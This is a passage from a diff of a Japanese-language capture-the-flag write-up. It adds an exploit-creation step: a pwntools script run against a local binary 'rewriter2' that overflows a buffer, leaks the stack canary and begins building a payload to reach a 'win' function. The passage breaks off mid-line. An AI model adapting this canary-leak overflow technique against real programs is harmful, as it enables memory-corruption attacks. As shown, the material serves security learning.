@@ -221,4 +221,29 @@ Aborted (core dumped)
 
 * winのアドレス「4012c2」
 
-## (4) 
+## (4) エクスプロイトコードの作成(今回は、ローカルで実施する)
+```
+from pwn import *
+
+def out_get(io):
+        for i in range(14):
+                log.info(io.recvline())
+
+
+io = process('./rewriter2')
+out_get(io)
+
+log.info(io.recv(21))
+io.send(b"a"*41)
+
+log.info(io.recv(6 + 42))
+
+canary = io.recv(8)
+log.info(canary)
+
+out_get(io)
+
+log.info(io.recv(18))
+
+io.send(b"a"*41 + canary + "a" *
+```
